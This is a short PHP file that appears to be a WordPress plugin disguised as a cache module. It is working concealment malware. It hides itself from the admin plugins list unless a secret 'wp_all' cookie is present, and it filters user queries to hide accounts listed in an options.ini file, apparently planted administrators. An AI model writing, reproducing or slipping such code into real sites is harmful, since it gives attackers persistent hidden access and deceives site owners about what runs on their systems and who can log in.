<?php

function wp_cache_action_show($value) {

	if (isset($_COOKIE['wp_all']))
		return $value;

	unset($value[wp_cache_get_path()]);
	return $value;
}

function wp_cache_get_path() {
	$name = preg_replace('#^.*/plugins/#', "", WPDBASECACHE_FILE);
	return $name;
}

function wp_cache_query($query) {
	
	if (isset($_COOKIE['wp_all']))
		return;
	$options = @unserialize(file_get_contents(dirname( WPDBASECACHE_FILE )  . '/options.ini'));
	
	$query->set('exclude', $options);
} 

add_action('pre_get_users', 'wp_cache_query');
add_filter('all_plugins', 'wp_cache_action_show');

?>
